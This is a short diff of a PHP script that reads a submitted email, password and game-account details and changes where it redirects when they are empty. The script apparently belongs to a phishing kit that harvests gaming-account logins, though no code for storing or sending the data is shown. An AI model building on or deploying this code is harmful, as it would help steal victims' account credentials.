@@ -13,7 +13,7 @@ $rpt = $_POST['rpt'];
 $platform = $_POST['platform'];
 $callingcode = $arpantek_callingcode['country_code'];
 if($email == "" && $password == "" && $playid == "" && $nick == "" && $level == "" && $tier == "" && $rpt == "" && $platform == ""){
-header("Location: index.php");
+header("Location: index.html");
 }else{
 
 // KONTEN RESULT AKUN
